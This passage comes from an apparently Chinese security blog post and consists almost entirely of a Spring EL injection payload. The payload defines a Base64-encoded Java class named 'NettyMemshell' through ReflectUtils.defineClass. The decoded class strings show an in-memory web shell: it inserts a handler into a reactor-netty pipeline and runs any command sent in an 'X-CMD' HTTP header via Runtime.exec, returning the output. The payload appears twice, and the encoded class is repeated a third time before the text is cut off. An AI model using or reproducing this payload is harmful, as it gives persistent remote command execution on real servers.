QAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABdqYXZhL2xhbmcvcmVmbGVjdC9BcnJheQEACWdldExlbmd0aAEAFShMamF2YS9sYW5nL09iamVjdDspSQEAA2dldAEAJyhMamF2YS9sYW5nL09iamVjdDtJKUxqYXZhL2xhbmcvT2JqZWN0OwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAB2dldE5hbWUBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQANZ2V0U3VwZXJjbGFzcwEAA3NldAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgEAGGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbAEAJCgpTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAIGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lAQAJYWRkQmVmb3JlAQBpKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyOylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsUGlwZWxpbmU7AQAHaGVhZGVycwEAKygpTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyczsBACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnMBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAuaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cwEAAk9LAQAPcHJpbnRTdGFja1RyYWNlAQAmaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQBAA9maXJlQ2hhbm5lbFJlYWQBADwoTGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsBACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFZlcnNpb24BAAhIVFRQXzFfMQEAKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFZlcnNpb247AQAZaW8vbmV0dHkvdXRpbC9DaGFyc2V0VXRpbAEABVVURl84AQAaTGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDsBABhpby9uZXR0eS9idWZmZXIvVW5wb29sZWQBAAxjb3BpZWRCdWZmZXIBAE0oTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDspTGlvL25ldHR5L2J1ZmZlci9CeXRlQnVmOwEAdShMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uO0xpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlc3BvbnNlU3RhdHVzO0xpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjspVgEALGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9GdWxsSHR0cFJlc3BvbnNlAQAraW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJOYW1lcwEADENPTlRFTlRfVFlQRQEAG0xpby9uZXR0eS91dGlsL0FzY2lpU3RyaW5nOwEAVShMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL09iamVjdDspTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyczsBAA13cml0ZUFuZEZsdXNoAQA0KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlOwEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZUxpc3RlbmVyAQAFQ0xPU0UBAChMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlTGlzdGVuZXI7AQAeaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlAQALYWRkTGlzdGVuZXIBAFIoTGlvL25ldHR5L3V0aWwvY29uY3VycmVudC9HZW5lcmljRnV0dXJlTGlzdGVuZXI7KUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxGdXR1cmU7ACEAFwA+AAEAPwAAAAUAAQBAAEEAAQBCAAAALwABAAEAAAAFKrcAAbEAAAACAEMAAAAGAAEAAAAQAEQAAAAMAAEAAAAFAEUARgAAAAkARwBIAAEAQgAAAcMABAAKAAAAtRICSxIDEgQDvQAFtgAGTCsEtgAHKwEDvQAItgAJTQM+HSy4AAqiAIcsHbgACzoEGQTGAHUZBLYADLYADRIOtgAPmQBlGQS2AAwSELYAEToFGQUEtgASGQUZBLYAEzoGGQa2AAy2ABQSFbYAEToHGQcEtgASGQcZBrYAEzoIGQi2AAy2ABS2ABQSFrYAEToJGQkEtgASGQkZCLsAF1m3ABi2ABkSGkuEAwGn/3enAAdMEhxLKrAAAQADAKwArwAbAAMAQwAAAFoAFgAAABIAAwAUAA8AFQAUABYAHgAYACgAGQAvABoARAAbAFAAHABWAB0AXwAeAG4AHwB0ACAAfQAhAI8AIgCVACMAowAkAKYAGACsACkArwAnALAAKACzACoARAAAAHAACwBQAFYASQBKAAUAXwBHAEsATAAGAG4AOABNAEoABwB9ACkATgBMAAgAjwAXAE8ASgAJAC8AdwBQAEwABAAgAIwAUQBSAAMADwCdAFMAVAABAB4AjgBVAEwAAgCwAAMAVgBXAAEAAwCyAFgAWQAAAFoAAAAeAAX/ACAABAcAWwcAXAcACAEAAPsAhfgABUIHABsDAAEAXQBeAAIAQgAAAHYABQAFAAAAHCy5AB0BADoEGQQSHhIfuwAXWbcAGLkAIAQAV7EAAAACAEMAAAAOAAMAAAAwAAgAMgAbADMARAAAADQABQAAABwARQBGAAAAAAAcAF8AYAABAAAAHABhAGIAAgAAABwAYwBkAAMACAAUAGUAZgAEAGcAAAANAwBfAAAAYQAAAGMAAAABAGgAaQADAEIAAAEQAAQABgAAAGEswQAhmQBULMAAIU4tuQAiAQASI7YAJJkANy25ACIBABIjtgAlOgS7ACZZuAAnGQS2ACi2ACm3ACoSK7YALLYALToFKisZBbIALrcAL7GnAAo6BBkEtgAwKyy5ADECAFexAAEADABNAFEAGwADAEMAAAAyAAwAAAA5AAcAOgAMADwAGgA9ACcAPgBDAEAATQBBAE4ARQBRAEMAUwBEAFgARwBgAEgARAAAAEgABwAnACcAagBZAAQAQwALAGsAWQAFAFMABQBWAFcABAAMAEwAbABtAAMAAABhAEUARgAAAAAAYQBuAG8AAQAAAGEAWABMAAIAWgAAAA8AA/wATgcAIUIHABv6AAYAcAAAAAQAAQAbAGcAAAAJAgBuAAAAWAAAAAIAcQByAAIAQgAAAJQABgAFAAAANrsAMlmyADMtLLIANLgANbcANjoEGQS5ADcBALIAOBI5tgA6VysZBLkAOwIAsgA8uQA9AgBXsQAAAAIAQwAAABIABAAAAEwAFABNACQATgA1AE8ARAAAADQABQAAADYARQBGAAAAAAA2AG4AbwABAAAANgBzAFkAAgAAADYAdAB1AAMAFAAiAHYAdwAEAGcAAAANAwBuAAAAcwAAAHQAAAABAHgAAAACAHk=&#x27;),<br>     new javax.management.loading.MLet(new java.net.URL[0],<br>         T(java.lang.Thread).currentThread().getContextClassLoader())<br> ).doInject()&#125;<br>#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;NettyMemshell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;yv66vgAAADQBDwoAPgB6CAB7BwB8CABTBwB9CgAFAH4KAFwAfwcAgAoAXACBCgCCAIMKAIIAhAoACACFCgAFAIYIAIcKAFsAiAgASwoABQCJCgCKAH8KAIoAiwoABQCMCABOCACNBwCOCgAXAHoKAIoAjwgAkAcAkQgAkgsAkwCUCACVCACWCwCXAJgHAJkLACEAmggAmwoAnACdCgCcAJ4HAJ8KAKAAoQoAoACiCgCjAKQKACYApQgApgoAJgCnCgAmAKgJAKkAqgoAFwCrCgAbAKwLAK0ArgcArwkAsACxCQCyALMKALQAtQoAMgC2CwC3AJoJALgAuQgAugoAnAC7CwCtALwJAL0AvgsAvwDABwDBBwDCAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MTmV0dHlNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVX3ZhbCRkaXNwb3NhYmxlU2VydmVyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAFHZhbCRkaXNwb3NhYmxlU2VydmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHX2NvbmZpZwEABmNvbmZpZwEAEF9kb09uQ2hhbm5lbEluaXQBAAZ0aHJlYWQBAAFpAQABSQEACmdldFRocmVhZHMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB3RocmVhZHMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAwwcAxAEADW9uQ2hhbm5lbEluaXQBAFcoTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7TGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KVYBABJjb25uZWN0aW9uT2JzZXJ2ZXIBACJMcmVhY3Rvci9uZXR0eS9Db25uZWN0aW9uT2JzZXJ2ZXI7AQAHY2hhbm5lbAEAGkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7AQANc29ja2V0QWRkcmVzcwEAGExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEACHBpcGVsaW5lAQAiTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAtjaGFubmVsUmVhZAEAPShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9PYmplY3Q7KVYBAANjbWQBAApleGVjUmVzdWx0AQALaHR0cFJlcXVlc3QBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXF1ZXN0OwEAA2N0eAEAKExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsBAApFeGNlcHRpb25zAQAEc2VuZAEAbShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9TdHJpbmc7TGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7KVYBAAdjb250ZXh0AQAGc3RhdHVzAQAwTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7AQAIcmVzcG9uc2UBAC5MaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0Z1bGxIdHRwUmVzcG9uc2U7AQAKU291cmNlRmlsZQEAEk5ldHR5TWVtc2hlbGwuamF2YQwAQABBAQAMaW5qZWN0LXN0YXJ0AQAQamF2YS9sYW5nL1RocmVhZAEAD2phdmEvbGFuZy9DbGFzcwwAxQDGDADHAMgBABBqYXZhL2xhbmcvT2JqZWN0DADJAMoHAMsMAMwAzQwAzgDPDADQANEMANIASAEADk5ldHR5V2ViU2VydmVyDADTANQMANUA1gcA1wwAzgDYDADZANEBAA9kb09uQ2hhbm5lbEluaXQBAA1OZXR0eU1lbXNoZWxsDADaANsBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IHANwMAGUA3QEAH3JlYWN0b3IubGVmdC5odHRwVHJhZmZpY0hhbmRsZXIBABBtZW1zaGVsbF9oYW5kbGVyBwDeDADfAOABACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlcXVlc3QMAOEA4gEABVgtQ01EBwDjDADTAOQMAM4A5QEAEWphdmEvdXRpbC9TY2FubmVyBwDmDADnAOgMAOkA6gcA6wwA7ADtDABAAO4BAAJcQQwA7wDwDADxAEgHAPIMAPMAdQwAcQByDAD0AEEHAPUMAPYA9wEAM2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9EZWZhdWx0RnVsbEh0dHBSZXNwb25zZQcA+AwA+QD6BwD7DAD8AP0HAP4MAP8BAAwAQAEBBwECBwEDDAEEAQUBABl0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04DADaAQYMAQcBCAcBCQwBCgELBwEMDAENAQ4BACVpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxEdXBsZXhIYW5kbGVyAQAncmVhY3Rvci9uZXR0eS9DaGFubmVsUGlwZWxpbmVDb25maWd1cmVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAXamF2YS9sYW5nL3JlZmxlY3QvQXJyYXkBAAlnZXRMZW5ndGgBABUoTGphdmEvbGFuZy9PYmplY3Q7KUkBAANnZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7SSlMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANzZXQBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBABhpby9uZXR0eS9jaGFubmVsL0NoYW5uZWwBACQoKUxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBACBpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZQEACWFkZEJlZm9yZQEAaShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlcjspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAB2hlYWRlcnMBACsoKUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBIZWFkZXJzAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEALmlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXMBAAJPSwEAD3ByaW50U3RhY2tUcmFjZQEAJmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0AQAPZmlyZUNoYW5uZWxSZWFkAQA8KExqYXZhL2xhbmcvT2JqZWN0OylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAnaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uAQAISFRUUF8xXzEBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBWZXJzaW9uOwEAGWlvL25ldHR5L3V0aWwvQ2hhcnNldFV0aWwBAAVVVEZfOAEAGkxqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7AQAYaW8vbmV0dHkvYnVmZmVyL1VucG9vbGVkAQAMY29waWVkQnVmZmVyAQBNKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlO0xqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQ7KUxpby9uZXR0eS9idWZmZXIvQnl0ZUJ1ZjsBAHUoTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwVmVyc2lvbjtMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXNwb25zZVN0YXR1cztMaW8vbmV0dHkvYnVmZmVyL0J5dGVCdWY7KVYBACxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvRnVsbEh0dHBSZXNwb25zZQEAK2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwSGVhZGVyTmFtZXMBAAxDT05URU5UX1RZUEUBABtMaW8vbmV0dHkvdXRpbC9Bc2NpaVN0cmluZzsBAFUoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9PYmplY3Q7KUxpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cEhlYWRlcnM7AQANd3JpdGVBbmRGbHVzaAEANChMamF2YS9sYW5nL09iamVjdDspTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZTsBACZpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxGdXR1cmVMaXN0ZW5lcgEABUNMT1NFAQAoTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZUxpc3RlbmVyOwEAHmlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEZ1dHVyZQEAC2FkZExpc3RlbmVyAQBSKExpby9uZXR0eS91dGlsL2NvbmN1cnJlbnQvR2VuZXJpY0Z1dHVyZUxpc3RlbmVyOylMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsRnV0dXJlOwAhABcAPgABAD8AAAAFAAEAQABBAAEAQgAAAC8AAQABAAAABSq3AAGxAAAAAgBDAAAABgABAAAADgBEAAAADAABAAAABQBFAEYAAAAJAEcASAABAEIAAAHDAAQACgAAALUSAksSAxIEA70ABbYABkwrBLYABysBA70ACLYACU0DPh0suAAKogCHLB24AAs6BBkExgB1GQS2AAy2AA0SDrYAD5kAZRkEtgAMEhC2ABE6BRkFBLYAEhkFGQS2ABM6BhkGtgAMtgAUEhW2ABE6BxkHBLYAEhkHGQa2ABM6CBkItgAMtgAUtgAUEha2ABE6CRkJBLYAEhkJGQi7ABdZtwAYtgAZEhpLhAMBp/93pwAHTBIcSyqwAAEAAwCsAK8AGwADAEMAAABaABYAAAAQAAMAEgAPABMAFAAUAB4AFgAoABcALwAYAEQAGQBQABoAVgAbAF8AHABuAB0AdAAeAH0AHwCPACAAlQAhAKMAIgCmABYArAAnAK8AJQCwACYAswAoAEQAAABwAAsAUABWAEkASgAFAF8ARwBLAEwABgBuADgATQBKAAcAfQApAE4ATAAIAI8AFwBPAEoACQAvAHcAUABMAAQAIACMAFEAUgADAA8AnQBTAFQAAQAeAI4AVQBMAAIAsAADAFYAVwABAAMAsgBYAFkAAABaAAAAHgAF/wAgAAQHAFsHAFwHAAgBAAD7AIX4AAVCBwAbAwABAF0AXgACAEIAAAB2AAUABQAAABwsuQAdAQA6BBkEEh4SH7sAF1m3ABi5ACAEAFexAAAAAgBDAAAADgADAAAALgAIADAAGwAxAEQAAAA0AAUAAAAcAEUARgAAAAAAHABfAGAAAQAAABwAYQBiAAIAAAAcAGMAZAADAAgAFABlAGYABABnAAAADQMAXwAAAGEAAABjAAAAAQBoAGkAAwBCAAABEAAEAAYAAABhLMEAIZkAVCzAACFOLbkAIgEAEiO2ACSZADctuQAiAQASI7YAJToEuwAmWbgAJxkEtgAotgAptwAqEiu2ACy2AC06BSorGQWyAC63AC+xpwAKOgQZBLYAMCssuQAxAgBXsQABAAwATQBRABsAAwBDAAAAMgAMAAAANwAHADgADAA6ABoAOwAnADwAQwA+AE0APwBOAEMAUQBBAFMAQgBYAEUAYABGAEQAAABIAAcAJwAnAGoAWQAEAEMACwBrAFkABQBTAAUAVgBXAAQADABMAGwAbQADAAAAYQBFAEYAAAAAAGEAbgBvAAEAAABhAFgATAACAFoAAAAPAAP8AE4HACFCBwAb+gAGAHAAAAAEAAEAGwBnAAAACQIAbgAAAFgAAAACAHEAcgACAEIAAACUAAYABQAAADa7ADJZsgAzLSyyADS4ADW3ADY6BBkEuQA3AQCyADgSObYAOlcrGQS5ADsCALIAPLkAPQIAV7EAAAACAEMAAAASAAQAAABKABQASwAkAEwANQBNAEQAAAA0AAUAAAA2AEUARgAAAAAANgBuAG8AAQAAADYAcwBZAAIAAAA2AHQAdQADABQAIgB2AHcABABnAAAADQMAbgAAAHMAAAB0AAAAAQB4AAAAAgB5&#x27;),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject()&#125;<br></code></pre></td></tr></table></figure>



<p>NettyMemshell.class -&gt; Base64 ç¼–ç ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511272101289.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">yv66vgAAADQBDwoAPgB6CAB7BwB8CABTBwB9CgAFAH4KAFwAfwcAgAoAXACBCgCCAIMKAIIAhAoACACFCgAFAIYIAIcKAFsAiAgASwoABQCJCgCKAH8KAIoAiwoABQCMCABOCACNBwCOCgAXAHoKAIoAjwgAkAcAkQgAkgsAkwCUCACVCACWCwCXAJgHAJkLACEAmggAmwoAnACdCgCcAJ4HAJ8KAKAAoQoAoACiCgCjAKQKACYApQgApgoAJgCnCgAmAKgJAKkAqgoAFwCrCgAbAKwLAK0ArgcArwkAsACxCQCyALMKALQAtQoAMgC2CwC3AJoJALgAuQgAugoAnAC7CwCtALwJAL0AvgsAvwDABwDBBwDCAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA9MTmV0dHlNZW1zaGVsbDsBAAhkb0luamVjdAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVX3ZhbCRkaXNwb3NhYmxlU2VydmVyAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAFHZhbCRkaXNwb3NhYmxlU2VydmVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAHX2NvbmZpZwEABmNvbmZpZwEAEF9kb09uQ2hhbm5lbEluaXQBAAZ0aHJlYWQBAAFpAQABSQEACmdldFRocmVhZHMBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAB3RocmVhZHMBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADbXNnAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAwwcAxAEADW9uQ2hhbm5lbEluaXQBAFcoTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyO0xpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7TGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KVYBABJjb25uZWN0aW9uT2JzZXJ2ZXIBACJMcmVhY3Rvci9uZXR0eS9Db25uZWN0aW9uT2JzZXJ2ZXI7AQAHY2hhbm5lbAEAGkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWw7AQANc29ja2V0QWRkcmVzcwEAGExqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOwEACHBpcGVsaW5lAQAiTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbFBpcGVsaW5lOwEAEE1ldGhvZFBhcmFtZXRlcnMBAAtjaGFubmVsUmVhZAEAPShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9PYmplY3Q7KVYBAANjbWQBAApleGVjUmVzdWx0AQALaHR0cFJlcXVlc3QBAClMaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0h0dHBSZXF1ZXN0OwEAA2N0eAEAKExpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxIYW5kbGVyQ29udGV4dDsBAApFeGNlcHRpb25zAQAEc2VuZAEAbShMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7TGphdmEvbGFuZy9TdHJpbmc7TGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7KVYBAAdjb250ZXh0AQAGc3RhdHVzAQAwTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVzcG9uc2VTdGF0dXM7AQAIcmVzcG9uc2UBAC5MaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0Z1bGxIdHRwUmVzcG9uc2U7AQAKU291cmNlRmlsZQEAEk5ldHR5TWVtc2hlbGwuamF2YQwAQABBAQAMaW5qZWN0LXN0YXJ0AQAQamF2YS9sYW5nL1RocmVhZAEAD2phdmEvbGFuZy9DbGFzcwwAxQDGDADHAMgBABBqYXZhL2xhbmcvT2JqZWN0DADJAMoHAMsMAMwAzQwAzgDPDADQANEMANIASAEADk5ldHR5V2ViU2VydmVyDADTANQMANUA1gcA1wwAzgDYDADZANEBAA9kb09uQ2hhbm5lbEluaXQBAA1OZXR0eU1lbXNoZWxsDADaANsBAA5pbmplY3Qtc3VjY2VzcwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAxpbmplY3QtZXJyb3IHANwMAGUA3QEAH3JlYWN0b3IubGVmdC5odHRwVHJhZmZpY0hhbmRsZXIBABBtZW1zaGVsbF9oYW5kbGVyBwDeDADfAOABACdpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlcXVlc3QMAOEA4gEABVgtQ01EBwDjDADTAOQMAM4A5QEAEWphdmEvdXRpbC9TY2FubmVyBwDmDADnAOgMAOkA6gcA6wwA7ADtDABAAO4BAAJcQQwA7wDwDADxAEgHAPIMAPMAdQwAcQByDAD0AEEHAPUMAPYA9wEAM2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9EZWZhdWx0RnVsbEh0dHBSZXNwb25zZQcA+AwA+QD6BwD7DAD8AP0HAP4MAP8BAAwAQAEBBwECBwEDDAEEAQUBABl0ZXh0L3BsYWluOyBjaGFyc2V0PVVURi04DADaAQYMAQcBCAcBCQwBCgELBwEMDAENAQ4BACVpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxEdXBsZXhIYW5kbGVyAQAncmVhY3Rvci9uZXR0eS9DaGFubmVsUGlwZWxpbmVDb25maWd1cmVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZh